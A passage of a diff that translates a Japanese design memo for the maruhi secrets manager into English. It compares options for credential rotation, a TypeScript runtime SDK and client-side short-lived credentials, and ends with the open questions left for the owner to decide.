+"Upstream" means the **issuer** of values stored in maruhi — AWS access keys, DB passwords, Stripe keys, etc. Rotation is 5 steps: ① a trigger (periodic / a member leaving / suspected leak) → ② create new credentials at the issuer (needs admin rights at the issuer) → ③ write the new value to maruhi **signed** → ④ get it to consumers (sync / redeploy) → ⑤ disable the old credentials after a grace period.
+maruhi has implemented ①'s detection ("rotation-needed detection"). ②③⑤ are unimplemented, and ③ hits the constraint "only humans sign".
 
-### 案の列挙
+### Enumerating the options
 
-**案 R1. 検出 + 手順書(現状 + docs)**
-`rotation list` が出す対象について、発行元ごとの手順(AWS: 2 本目のキーを作る → 差し替え → 旧キー無効化)を docs に置く。
-- 評価 **○(土台)**: コスト最小。個人・小チームは実はこれで足りる
+**Option R1. Detection + procedures doc (current state + docs)**
+For every subject `rotation list` surfaces, put per-issuer procedures in docs (AWS: create a second key → swap → disable the old key).
+- Rating **○ (the foundation)**: minimal cost. For individuals and small teams this is actually enough
 
-**案 R2. `maruhi var rotate <var>`(CLI 実行・コネクタ方式)**
-メンバーの CLI がコネクタ(AWS IAM アクセスキー / Postgres・MySQL パスワード / Cloudflare API トークン等)で ② を実行し、③ を自分の鍵で署名して push、⑤ は `--finalize` で後日実行(二重資格の猶予)。発行元の管理者資格は maruhi の別変数として保存しメモリで取り出す。
-- 署名: 人間。平文: 各人の機械。コスト: 中(コネクタごと)。自動化: なし(人が打つ)
-- 評価 **◎(最小の本体)**: 仕様を一切変えない。「退出したメンバーが触れた値」を `rotation list` から 1 コマンドで回せれば、退職時ローテの義務(§7)が現実に守られる
+**Option R2. `maruhi var rotate <var>` (CLI-driven, connector model)**
+A member's CLI performs ② via a connector (AWS IAM access key / Postgres·MySQL password / Cloudflare API token etc.), signs ③ with their own key and pushes; ⑤ runs later via `--finalize` (the dual-credential grace period). The issuer's admin credential is stored as another maruhi variable, fetched into memory.
+- Signing: human. Plaintext: each person's machine. Cost: medium (per connector). Automation: none (a human runs it)
+- Rating **◎ (the minimal core)**: changes no spec at all. If `rotation list`'s "values the departed member touched" can be rotated in 1 command, the leaver-rotation obligation (§7) is actually kept
 
-**案 R3. 退出時チェックリストへの統合(R2 の UX)**
-`member remove` の直後に、その人が復号できた環境の変数のうち「上流を持つもの」を列挙し、R2 を順に促す。上流を持つかどうかは値なしスキーマの型(`var_type`)や宣言から推定できる。
-- 評価 **◎(R2 と一体)**: 差別化の中核「人間が間違えても機構で守る」(ADR-0014 決定 3)の具体形
+**Option R3. Integrate into the leaver checklist (R2's UX)**
+Right after `member remove`, enumerate "the ones with an upstream" among the variables in environments that person could decrypt, and prompt R2 in order. Whether a variable has an upstream can be inferred from the value-less schema's type (`var_type`) or declarations.
+- Rating **◎ (one with R2)**: the concrete form of the differentiating core "even when a human errs, the mechanism protects" (ADR-0014 decision 3)
 
-**案 R4. CI からの定期ローテーション + 封印提案(sealed proposal)**
-GitHub Actions の cron で R2 のコネクタを走らせたいが、CI は署名鍵を持たないので ③ ができない。解決: CI は新しい値を**現メンバー全員の公開鍵へ HPKE で封印した「提案」**としてサーバーに置く(公開鍵はチェーン上にあるので CI でも封印できる)。次にメンバーの誰かが `maruhi rotation approve` を打つと、CLI が復号・検証・署名して正式な値になる。発行元は二重資格の猶予中なので、承認までの間も旧資格で動き続ける。
-- 署名: 人間(副署)。平文: CI ランナーと承認者の機械。サーバー: 封印物のみ。コスト: 中〜大(提案の保存・一覧・期限・監査・承認 UX)。仕様: 提案は署名対象の外にある運搬データなので CRYPTO_SPEC の検証規則は変わらないが、提案の形式(AAD・受信者集合)は §5 の範囲で規定が要る
-- 評価 **○(定期ローテの需要が出たら)**: 機械メンバーを作らずに自動化できる、maruhi らしい形。「四眼 / 承認付き」(将来項)への足がかりにもなる
+**Option R4. Scheduled rotation from CI + sealed proposals**
+We'd like to run R2's connectors on GitHub Actions cron, but CI holds no signing key so ③ is impossible. The fix: CI places the new value on the server as a **"proposal" sealed via HPKE to every current member's public key** (the public keys are on the chain, so CI can seal). The next member to run `maruhi rotation approve` makes the CLI decrypt, verify, sign — turning it into a real value. Since the issuer is in the dual-credential grace period, the old credentials keep working until approval.
+- Signing: human (countersign). Plaintext: the CI runner and the approver's machine. Server: sealed material only. Cost: medium-to-large (proposal storage, listing, expiry, audit, approval UX). Spec: since a proposal is carried data outside the signed object, CRYPTO_SPEC's verification rules don't change, but the proposal's format (AAD, recipient set) needs definition within §5's scope
+- Rating **○ (when scheduled-rotation demand appears)**: automation without creating machine members — a very maruhi shape. Also a foothold for "four-eyes / approval-gated" (a future item)
 
-**案 R5. 機械メンバー(サービスアカウント)に署名鍵を持たせる**
-CI や常駐プロセスに署名鍵を持たせ、値を直接 push できるようにする(Phase / Infisical の service account)。
-- 評価 **△〜×**: 長期資格を CI に置くことになり、リース設計が避けた形(CRYPTO_SPEC §9.1「長期資格情報を持たないワークロード」)へ逆行する。R4 で回避できる限り採らない。採るなら「署名するのは人間だけ」を撤回する ADR が要る
+**Option R5. Give signing keys to machine members (service accounts)**
+Let CI or daemons hold signing keys so they can push values directly (Phase / Infisical-style service accounts).
+- Rating **△–×**: it places a long-term credential on CI — running against the shape the lease design avoided (CRYPTO_SPEC §9.1 "workloads without long-term credentials"). Not taken while R4 can avoid it. If taken, it needs an ADR retracting "only humans sign"
 
-**案 R6. サーバー駆動ローテーション(Doppler / Infisical 型)**
-サーバーが発行元の管理者資格を持ち、定期的に ② を実行し ③ を書く。
-- 評価 **×**: サーバーに署名鍵を持たせる必要があり、「サーバー単独では値を偽造できない」(§14.2-2)を手放す。発行元の管理者資格をサーバーに預けるのも信頼の集中。長時間処理で Containers も要る。セルフホストでも採らない(R4 で足りる)
+**Option R6. Server-driven rotation (Doppler / Infisical style)**
+The server holds the issuer's admin credentials, periodically runs ②, and writes ③.
+- Rating **×**: it requires the server to hold signing keys, abandoning "the server alone can't forge values" (§14.2-2). Depositing the issuer's admin credentials on the server also concentrates trust. Long-running processing needs Containers too. Not taken even self-hosted (R4 suffices)
 
-**案 R7. 静的資格をなくす方向へ誘導(フェデレーション)**
-AWS / GCP はそもそもアクセスキーを持たず、OIDC からロールを引き受ける(GitHub OIDC → STS、Vercel OIDC → AWS)。maruhi はロール ARN のような非秘密の設定だけを持つ。
-- 評価 **○(docs の立場として)**: ローテーションの最良解は「回さなくていい資格にする」。maruhi が競合しない領域(STS)を正直に案内する。§6 と同じ結論
+**Option R7. Guide toward eliminating static credentials (federation)**
+AWS / GCP don't hold access keys at all — they assume roles from OIDC (GitHub OIDC → STS, Vercel OIDC → AWS). maruhi would then hold only non-secret config like role ARNs.
+- Rating **○ (as docs' stance)**: rotation's best answer is "be a credential that never needs rotating". Honestly guide toward the area maruhi doesn't compete in (STS). Same conclusion as §6
 
-**案 R8. 参照型の変数(値でなく `aws-sm://…` のポインタを持つ)**
-発行元の自動ローテーション(AWS SM の rotation lambda)に任せ、maruhi は参照だけ持ち、`run` 時にクライアントが自分のクラウド資格で解決する。
-- 評価 **△**: 実用的だが、maruhi が「金庫」でなく「索引」になり位置づけが薄まる。既に AWS SM を運用している企業向けの後続案として記録
+**Option R8. Reference-type variables (hold an `aws-sm://…` pointer, not the value)**
+Leave it to the issuer's own rotation (AWS SM's rotation lambda); maruhi holds only the reference, and at `run` time the client resolves it with their own cloud credentials.
+- Rating **△**: practical, but maruhi becomes an "index" rather than a "vault" and its positioning thins. Recorded as a follow-on option for enterprises already running AWS SM
 
-**案 R9. 期限つき値(TTL の宣言 + 期限切れ警告)**
-値なしスキーマに `expires_at` 相当を宣言し、期限で `rotation list` に載せる。
-- 評価 **○(小さく、R1〜R3 の補助)**: 実装は軽い。ローテーションを「回す」のではなく「忘れない」ための機構
+**Option R9. Expiring values (TTL declaration + expiry warnings)**
+Declare an `expires_at`-equivalent on the value-less schema; surface them in `rotation list` at expiry.
+- Rating **○ (small, an aid to R1–R3)**: light to implement. A mechanism for "not forgetting" rather than "rotating"
 
-新案打ち止め: 「ブラウザ拡張で発行元の画面を自動操作」「発行元の webhook で通知」は R2 の周辺であり独立案ではない。
+New-option exhaustion: "drive the issuer's UI with a browser extension" and "notify via the issuer's webhooks" are around R2's periphery, not independent options.
 
-### 推奨
+### Recommendation
 
-**R1 + R2 + R3 + R9 を「最小のローテーション」として実装する。R7 を docs の公式見解にする。R4 は定期ローテの需要が観測されてから。R5 / R6 はやらない。**
+**Implement R1 + R2 + R3 + R9 as "minimal rotation". Make R7 docs' official position. R4 waits until scheduled-rotation demand is observed. R5 / R6 are not done.**
 
-コネクタは最初 3 つに絞る(AWS IAM アクセスキー、Postgres / MySQL パスワード、Cloudflare API トークン)。コネクタはトレッドミル(Doppler は数年で 8 種)なので、「対応先の数」で戦わない。§6 の動的シークレット(クライアント側)と同じプラグインの枠にする。
+Connectors are capped at the first 3 (AWS IAM access key, Postgres / MySQL password, Cloudflare API token). Since connectors are a treadmill (Doppler has 8 after years), don't fight on "number of supported targets". Same plugin frame as §6's dynamic secrets (client-side).
 
 ---
 
 ## 5. SDK
 
-### 問題の定義
+### Problem definition
 
-SDK が欲しい場面は 2 つだけ。(a) `maruhi run` を差し込めないランタイム(Vercel / Lambda / Workers / Netlify)。(b) 環境変数以外の形で値を消費したい(ファイル・ホットリロード)。(a) は同期(§3)でも解けるので、SDK の固有価値は「同期先に平文を置かず、常に最新を取る」ことに絞られる。
+There are only 2 situations that want an SDK. (a) Runtimes where `maruhi run` can't be injected (Vercel / Lambda / Workers / Netlify). (b) Consuming values in a shape other than env vars (files, hot reload). Since (a) is also solvable by sync (§3), the SDK's distinct value narrows to "don't place plaintext at a destination; always fetch the latest".
 
-### 案の列挙
+### Enumerating the options
 
-**案 K1. SDK なし(`maruhi run` + 同期で全部済ませる)**
-- 評価 **○(現状維持の妥当性は高い)**: コンテナ / VM / K8s / CI は `run` で足りる。サーバーレスは §3 の同期で足りる。SDK がないことが失注理由になるのは「同期先に平文を置きたくない」人だけ
+**Option K1. No SDK (`maruhi run` + sync cover everything)**
+- Rating **○ (keeping the status quo is highly defensible)**: containers / VMs / K8s / CI are covered by `run`. Serverless is covered by §3's sync. The only lost deal from having no SDK is people who "don't want plaintext at the destination"
 
-**案 K2. TypeScript ランタイム SDK(リースのクライアント)**
-既存のワークロードリース(OIDC → 一時鍵へ DEK をラップ)のクライアントを TS で書く。`packages/crypto` と CLI の検証コード(チェーン・アンカー・マニフェスト・チェックポイント)を再利用。最初の issuer は Vercel OIDC。アプリは起動時に `await maruhi.load()` で値をメモリに得る。
-- 平文: ランタイムのメモリ。サーバー: grant ありだが復号しない(リース経路)。コスト: 中(検証コードの再利用が効く)。制約: 起動時に maruhi が落ちていると起動できない(G8。キャッシュを持たない限り)
-- 評価 **◎(やるならこれ)**: サーバーレスの主戦場(Vercel / Netlify / Deno Deploy / Workers)は JS なので、**TS 1 本で SDK の需要の大半を覆える**。同期(§3)の上位互換になるのは「コードを変えられるアプリ」に限る
+**Option K2. A TypeScript runtime SDK (a lease client)**
+Write the client of the existing workload lease (OIDC → DEK wrapped to an ephemeral key) in TS. Reuses `packages/crypto` and the CLI's verification code (chain / anchor / manifest / checkpoint). The first issuer is Vercel OIDC. The app gets values in memory at startup via `await maruhi.load()`.
+- Plaintext: the runtime's memory. Server: grants but doesn't decrypt (the lease path). Cost: medium (verification-code reuse pays off). Constraint: if maruhi is down at startup, the app can't start (G8 — unless it has a cache)
+- Rating **◎ (if we do it, this one)**: the serverless main battlefield (Vercel / Netlify / Deno Deploy / Workers) is JS, so **one TS SDK covers most of the demand**. Being a superset of sync (§3) is limited to "apps whose code can be changed"
 
-**案 K3. 多言語の検証付き SDK(Python / Go / …)**
-- 評価 **×(今は)**: 言語ごとにチェーン検証 + Ed25519 + HPKE + AES-GCM の実装が要る。個人開発の規模で正しく保てない。将来 WASM 化で 1 実装を配れる可能性はあるが、`packages/crypto` は WebCrypto 依存なので書き直しになる
+**Option K3. Verified multi-language SDKs (Python / Go / …)**
+- Rating **× (for now)**: each language needs its own chain-verification + Ed25519 + HPKE + AES-GCM implementation. Can't keep it correct at a solo-dev scale. WASM might eventually let one implementation be distributed, but `packages/crypto` depends on WebCrypto so it'd be a rewrite
 
-**案 K4. 平文を返す薄い SDK(Infisical / Doppler 型)**
-アプリがトークンで認証し、サーバーが grant 下で復号して平文を TLS で返す。SDK は HTTP クライアントだけなので多言語が容易。
-- 評価 **× ホステッド / △ セルフホスト**: サーバーが復号器になる(S5 と同じ位置)。セルフホストなら自分のアカウントなので許容できるが、K2 があれば要らない
+**Option K4. A thin SDK returning plaintext (Infisical / Doppler style)**
+The app authenticates with a token; the server decrypts under a grant and returns plaintext over TLS. The SDK is just an HTTP client, so multi-language is easy.
+- Rating **× hosted / △ self-hosted**: the server becomes the decryptor (same position as S5). Self-hosted it's your own account so tolerable, but unneeded if K2 exists
 
-**案 K5. サイドカー = CLI 自身(`maruhi serve --local`)**
-CLI が Unix ソケット / 127.0.0.1 で値を配り、任意言語のアプリは小さな HTTP クライアントで取る。暗号は全部 CLI 側。
-- 評価 **△**: コンテナ環境ではそもそも `run` で足りる。得られるのはホットリロードと「環境変数以外の形」だけ。ADR-0018 の localhost 値 API と同じ論点(値の口を開く)を抱える
+**Option K5. A sidecar = the CLI itself (`maruhi serve --local`)**
+The CLI serves values over a Unix socket / 127.0.0.1; apps in any language fetch with a tiny HTTP client. All crypto stays on the CLI side.
+- Rating **△**: in container environments `run` already suffices. What it adds is only hot reload and "a shape other than env vars". It carries the same concern as ADR-0018's localhost value API (opening a value outlet)
 
-**案 K6. Cloudflare service binding をワークロード ID に(セルフホスト限定。§3 S12 と同じ)**
-- 評価 **△**: K2 の issuer の 1 つとして後から足せる形にしておく(リースの claims_digest を service binding の呼び出し元 ID で構成する仕様追記が要る)
+**Option K6. A Cloudflare service binding as the workload ID (self-hosted only. Same as §3's S12)**
+- Rating **△**: keep it as a shape addable later as one of K2's issuers (needs a spec addendum forming the lease's claims_digest from the service binding's caller ID)
 
-**案 K7. メタデータ SDK(値なし。HttpApi 導出クライアント)**
-`maruhi schema` の消費者、監査の取得など、鍵を持たない用途向け。
-- 評価 **○(既に構造上ある)**: `packages/api-schema` から導出できる。公開 API として整えるだけ
+**Option K7. A metadata SDK (no values. An HttpApi-derived client)**
+For keyless uses — consumers of `maruhi schema`, fetching audits, etc.
+- Rating **○ (structurally already exists)**: derivable from `packages/api-schema`. Just needs grooming as a public API
 
-**案 K8. フレームワークプラグイン(Next / Nuxt / Vite の dev サーバー統合)**
-- 評価 **×**: `maruhi run -- next dev` で足りる。プラグインは供給網を増やすだけ
+**Option K8. Framework plugins (Next / Nuxt / Vite dev-server integration)**
+- Rating **×**: `maruhi run -- next dev` suffices. A plugin only grows the supply chain
 
-新案打ち止め: 「ビルド時に焼き込む」は秘密の扱いとして誤り(公開設定にしか使えない)。「ブラウザ SDK」はクライアントに秘密を持ち込む発想で対象外。
+New-option exhaustion: "bake values in at build time" is a wrong way to treat secrets (usable only for public config). A "browser SDK" introduces secrets to the client — out of scope.
 
-### 推奨
+### Recommendation
 
-**K1 を当面の立場とし、Vercel(または他の OIDC 発行環境)で「同期先に平文を置きたくない」という声が出た時点で K2 を TS 1 本で実装する。K3 / K4(ホステッド)/ K8 はやらない。K7 は公開 API として整備してよい。**
+**K1 is the standing position for now; the moment a "don't want plaintext at the destination" voice appears from Vercel (or another OIDC-issuing environment), implement K2 as a single TS SDK. K3 / K4 (hosted) / K8 are not done. K7 may be groomed as a public API.**
 
-順序は §3 の同期が先。理由: 同期はコードを変えなくても使え、SDK の需要そのものを測る材料になる。
-
----
-
-## 6. 動的シークレット
-
-### 問題の定義
-
-「動的」とは、要求のたびに短命な資格情報(30 分だけ有効な DB ユーザー、1 時間の IAM 資格)を**発行**すること。発行するには発行元の管理者資格を持ち、要求を受けて発行元 API を叩く「発行者」が要る。競合ではこの発行者がサーバーである。
-
-### 案の列挙
-
-**案 D1. サーバー発行(Infisical / Doppler / Phase 型。Containers に逃がす)**
-- 評価 **×**: 発行者 = 平文の管理者資格の保持者 = サーバー。ゼロ知識の外側に丸ごと落ちる。ADR-0001 が予告した「Containers へ逃がす」は技術的な逃げ道であって、信頼モデルの答えではない。個人開発の運用負荷(発行元ごとの接続・失効・監視)も大きい。**やらない**と決めてよい
-
-**案 D2. クライアント側の短命資格(`maruhi run --ephemeral <connector>`)**
-メンバーの CLI が、maruhi に入っている管理者資格をメモリで取り出し、自分のためだけの短命ユーザー / トークンを発行元で作って子プロセスに注入し、終了時に消す。
-- 発行者: 各人の機械(そのメンバーは元々その管理者資格を復号できる立場)。サーバー: 関与なし。コスト: 中(§4 R2 のコネクタと共用)
-- 評価 **○(後続)**: 「開発者ごとに DB ユーザーが分かれ、セッション終了で消える」は監査上の価値がある。仕様変更なし。ただし管理者資格そのものは静的なまま(その回し方は §4)
-
-**案 D3. ブローカーでの短命化(Phase 3 `maruhi proxy run` の延長)**
-credential brokering で実値を通信境界で差し替える際、差し替える値を**長期キーでなく、その場で発行した短命トークン**にする。例: GitHub App の秘密鍵から 1 時間のインストールトークン、OAuth の refresh → access、AWS の STS。エージェントは短命トークンすら見ない(プロキシが挿す)。
-- 発行者: 各人の機械のプロキシ。サーバー: 関与なし。コスト: 中(コネクタ)
-- 評価 **◎(Phase 3 の本線と一体)**: 「サーバーもエージェントも平文を持たない」の完成形で、競合の brokering(Infisical Agent Proxy はサーバーが平文を持つ)に対する明確な上位互換。ROADMAP Phase 3 ② の設計に「短命化コネクタ」を組み込む
-
-**案 D4. DO リース(既存の Phase 3 項「この変数だけ 30 分」)**
-短命な**アクセス**(既存の静的値への時間限定の権利)。資格情報自体は短命にならない。
-- 評価 **○(既定路線)**: D2 / D3 と組むと「短い時間だけ、短命な資格を」になる
-
-**案 D5. フェデレーションを公式見解にする(§4 R7 と同じ)**
-「クラウド資格は OIDC → STS / WIF で取る。maruhi は残りの静的な秘密(サードパーティ API キー等)を持つ」。docs に "What maruhi does not do" として書く。
-- 評価 **◎(立場として)**: 動的シークレットの最良解は「維持する秘密を減らす」ことで、それはクラウド側にある。maruhi が STS と競争する必要はない。Keyway の「訴求と実装の乖離」の反面教師として、できないことを先に書く
-
-**案 D6. 期限つき値の宣言(§4 R9 と同じ)**
-- 評価 **○(補助)**
-
-新案打ち止め: 「発行元の API を maruhi サーバーが代理で叩くが値はクライアント宛に封印」は、発行元 API の応答をサーバーが平文で受け取る時点で D1 と同じ。「ユーザー所有 Worker が発行者」は §3 S7 の変形で、需要が出たら S7 と同時に検討。
-
-### 推奨
-
-**D1 はやらない、と決める。D5 を docs の公式見解にする。D3 を Phase 3 の `maruhi proxy run` 設計に含める。D2 は §4 のコネクタ枠ができた後の追加候補。**
-
-LP / docs では "dynamic secrets" という語を使わず、"short-lived credentials, issued on your machine, never on our server" のように仕組みで書く(ADR-0014 ガードレール: 機能名で並ばない)。
+Order: §3's sync comes first. Reason: sync is usable without changing code, and it's the material that measures the SDK's actual demand.
 
 ---
 
-## 7. 横断で見つかった共通部品
+## 6. Dynamic secrets
 
-4 テーマの推奨案を重ねると、必要な部品は 3 つに収束する。**どれも機械メンバー(サービスアカウント)を必要としない** — 「署名するのは人間だけ」を保ったまま自動化できる。
+### Problem definition
 
-| 部品 | 使う案 | 何か | 仕様への影響 |
+"Dynamic" means **issuing** a short-lived credential on each request (a DB user valid for 30 minutes, 1-hour IAM credentials). Issuing requires an "issuer" that holds the provider's admin credential and calls the provider's API on request. Among competitors, this issuer is a server.
+
+### Enumerating the options
+
+**Option D1. Server-side issuance (Infisical / Doppler / Phase style. Offload to Containers)**
+- Rating **×**: issuer = holder of the plaintext admin credential = the server. Falls entirely outside zero-knowledge. The "offload to Containers" that ADR-0001 foreshadowed is a technical escape hatch, not an answer to the trust model. The solo-dev operational load (per-issuer connections, revocation, monitoring) is also large. Fair to **decide not to do it**
+
+**Option D2. Client-side short-lived credentials (`maruhi run --ephemeral <connector>`)**
+A member's CLI fetches the admin credential stored in maruhi into memory, creates a short-lived user / token at the issuer just for themselves, injects it into the child process, and removes it at exit.
+- Issuer: each person's machine (that member could already decrypt that admin credential anyway). Server: uninvolved. Cost: medium (shared with §4 R2's connectors)
+- Rating **○ (follow-on)**: "a distinct DB user per developer, gone at session end" has audit value. No spec change. But the admin credential itself stays static (how to rotate it is §4)
+
+**Option D3. Shortening at the broker (extension of Phase 3's `maruhi proxy run`)**
+When credential brokering swaps a real value at the communication boundary, make the substituted value **not a long-term key but a just-issued short-lived token**. Examples: a 1-hour installation token from a GitHub App's private key, OAuth refresh → access, AWS STS. The agent doesn't even see the short-lived token (the proxy inserts it).
+- Issuer: the proxy on each person's machine. Server: uninvolved. Cost: medium (connectors)
+- Rating **◎ (integral with Phase 3's main line)**: the completed form of "neither the server nor the agent holds plaintext", and a clear superset of competitors' brokering (Infisical Agent Proxy has the server holding plaintext). Build "shortening connectors" into ROADMAP Phase 3 ②'s design
+
+**Option D4. DO leases (the existing Phase 3 item "just this variable for 30 minutes")**
+Short-lived **access** (time-limited rights to existing static values). The credential itself doesn't become short-lived.
+- Rating **○ (the default course)**: combined with D2 / D3 it becomes "short-lived credentials for a short time"
+
+**Option D5. Make federation the official position (same as §4 R7)**
+"Cloud credentials come via OIDC → STS / WIF. maruhi holds the remaining static secrets (third-party API keys etc.)". Written in docs as "What maruhi does not do".
+- Rating **◎ (as a stance)**: dynamic secrets' best answer is "reduce the secrets you maintain", and that lives on the cloud side. maruhi needn't compete with STS. As a counterexample lesson from Keyway's "claim-implementation gap", write what it can't do first
+
+**Option D6. Expiring-value declarations (same as §4 R9)**
+- Rating **○ (an aid)**
+
+New-option exhaustion: "the maruhi server calls the issuer's API on your behalf but seals the value to the client" equals D1 the moment the server receives the issuer API's response in plaintext. "A user-owned Worker is the issuer" is a §3 S7 variant; consider it together with S7 when demand appears.
+
+### Recommendation
+
+**Decide D1 is not done. Make D5 docs' official position. Include D3 in Phase 3's `maruhi proxy run` design. D2 is a follow-on candidate after §4's connector frame exists.**
+
+On the LP / docs, don't use the term "dynamic secrets"; write the mechanism instead, like "short-lived credentials, issued on your machine, never on our server" (ADR-0014 guardrail: don't line up feature names).
+
+---
+
+## 7. Cross-cutting shared parts found
+
+Stacking the 4 themes' recommended options, the needed parts converge to 3. **None of them needs machine members (service accounts)** — automation is possible while keeping "only humans sign".
+
+| Part | Used by | What it is | Spec impact |
 |---|---|---|---|
-| ① 変更通知 webhook | S3 / S4、K2 のキャッシュ無効化、R4 の再実行 | 受理後に「何かが変わった」だけをユーザー設定の URL へ送る。値・名前・project_id を載せない | AUTH_SPEC に設定 API と監査行。CRYPTO_SPEC 無変更 |
-| ② コネクタ枠 | R2 / R3(回す)、D2 / D3(短命化)、S8(同期プリセット) | 「発行元の API を叩く」プラグインの共通 I/F。CLI 内蔵・MIT 側 | 無変更(クライアント実装) |
-| ③ 封印提案 | R4(CI からの定期ローテ)、将来の四眼承認 | 署名鍵のない自動処理が、候補値をメンバー公開鍵へ HPKE 封印して置き、人間が副署して確定 | CRYPTO_SPEC §5 の範囲で提案の AAD / 受信者集合を規定。検証規則は不変 |
+| ① Change-notification webhook | S3 / S4, K2's cache invalidation, R4 re-runs | After acceptance, sends only "something changed" to a user-configured URL. Carries no values, names, or project_id | AUTH_SPEC gains a config API and an audit row. CRYPTO_SPEC unchanged |
+| ② The connector frame | R2 / R3 (rotating), D2 / D3 (shortening), S8 (sync presets) | The shared I/F of "call the issuer's API" plugins. Built into the CLI, on the MIT side | Unchanged (a client implementation) |
+| ③ Sealed proposals | R4 (scheduled rotation from CI), future four-eyes approval | An automatic process without a signing key HPKE-seals a candidate value to member public keys and stores it; a human countersigns to finalize | CRYPTO_SPEC defines the proposal's AAD / recipient set within §5's scope. Verification rules unchanged |
 
-逆に、**採らないことを決めた形**も明確になった: サーバーに署名鍵を持たせる(R6 / D1)、CI に長期署名鍵を置く(R5)、ホステッドのサーバーが平文を扱う(S5 ホステッド / K4 ホステッド)、多言語の検証付き SDK(K3)、値ありの GUI(§2)。
+Conversely, the **shapes decided not to be taken** are also now clear: giving the server a signing key (R6 / D1), placing a long-term signing key on CI (R5), a hosted server handling plaintext (S5 hosted / K4 hosted), verified multi-language SDKs (K3), a value-bearing GUI (§2).
 
 ---
 
-## 8. 申し送り(所有者裁定が要る点)
+## 8. Handoff (points needing an owner ruling)
 
-1. **S5(サーバー復号 push)をセルフホスト限定にするか、ホステッドにも出すか。** 本メモは「セルフホスト限定」を推奨。ホステッドに出すなら ADR-0002 / 0014 の改訂案として
-2. **変更通知の送信先制約**: 任意 URL を許すか、GitHub `repository_dispatch` 等の既知先に限るか(SSRF・情報流出面。既知先限定を推奨)
-3. **封印提案(③)の要否**: R4 まで進めるなら CRYPTO_SPEC の追記が先(改訂 → 承認 → 実装の順は不変)
-4. **コネクタの初期集合**: 本メモは AWS IAM / Postgres・MySQL / Cloudflare API トークンの 3 つ + 同期プリセット Cloudflare Workers / Vercel / Netlify の 3 つを提案
-5. **価格表の Enterprise 枠**(所有者方針): SSO / SCIM / 同期の S5 / 監査ストリーミング等を「問い合わせ」に置き、需要の計測装置にする。実装は問い合わせが来てから
-6. **値なし `maruhi ui`(ADR-0018 第 2 段)の着手時期**: 値あり GUI の要否はこれの後にしか判断できない
+1. **Whether S5 (server-side decryption push) is self-hosted-only or also offered hosted.** This memo recommends "self-hosted-only". If offered hosted, it comes as an ADR-0002 / 0014 revision proposal
+2. **Change-notification destination constraint**: allow arbitrary URLs or limit to known destinations like GitHub `repository_dispatch` (SSRF / information-leak surface. Recommend limiting to known destinations)
+3. **Whether the sealed proposal (③) is needed**: if R4 proceeds, the CRYPTO_SPEC addendum comes first (the order revision → approval → implementation is unchanged)
+4. **The connectors' initial set**: this memo proposes 3 — AWS IAM / Postgres·MySQL / Cloudflare API token — plus 3 sync presets: Cloudflare Workers / Vercel / Netlify
+5. **The price table's Enterprise row** (owner policy): put SSO / SCIM / sync's S5 / audit streaming etc. under "contact us" as a demand gauge. Implementation starts only after inquiries arrive
+6. **When to start the value-less `maruhi ui` (ADR-0018 stage 2)**: whether a value-bearing GUI is needed can only be judged after that
